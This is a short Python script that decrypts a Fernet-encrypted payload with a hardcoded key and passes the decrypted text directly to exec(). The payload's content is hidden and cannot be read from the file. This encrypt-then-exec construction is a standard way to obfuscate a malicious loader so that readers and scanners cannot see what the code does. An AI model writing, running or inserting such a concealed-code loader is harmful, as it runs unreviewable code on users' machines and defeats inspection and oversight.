import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABkgSa94thjxXHP4M8TbSmUOCO0i3Z86Eraa5WM0ZKnPF2nuOrKPxX1nzJ99YmspgupzR8mj1aG9_8Dulyhuqln7PKQgpvZ00VIZDsxSiRopzrqAhA3e_ilWRoiTAMB7FYTVNbr_E-Y02dHTO8-B-L1GPFEwUXjcToX6o29Qh4zEJB4CMpkmZ4E74d3CDKF0blcYfMj41gz42sYbQCxreWfwR8GudWsghSpn9-Q5kcgdNkj1v2iSO6bwwtJ2hKt_YqO5oLEEK2Sqp3AdEyCjyAl80pwWA=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
